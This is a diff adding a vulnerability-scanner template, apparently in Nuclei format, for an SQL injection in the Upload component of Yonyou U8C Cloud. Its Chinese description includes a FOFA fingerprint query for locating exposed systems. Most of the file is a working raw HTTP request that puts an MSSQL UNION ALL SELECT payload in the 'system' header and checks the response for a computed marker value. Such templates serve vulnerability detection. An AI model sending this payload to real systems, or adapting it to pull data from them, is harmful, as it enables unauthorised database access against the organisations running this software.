@@ -1,0 +1,34 @@
+id: yonyou-u8c-cloud-upload-sqli
+
+info:
+  name: 用友 U8C Cloud Upload组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-NC-Cloud"或header="nccloud"
+      用友 U8C Cloud 系统的Upload组件存在SQL注入安全缺陷，攻击者可通过构造恶意请求参数实现数据库敏感信息获取。该漏洞影响范围涉及基于nccloud框架部署的业务系统，检测可通过FOFA指纹特征进行目标定位，漏洞披露时间为2024年4月30日。
+  tags: 用友-NC-Cloud
+
+http:
+- raw:
+  - |
+    POST /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    system: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
+    trantype: pk
+    isEncrypt: N
+    sign: token
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '12321'
+  - type: word
+    part: body
+    words:
+    - 'errorcode'
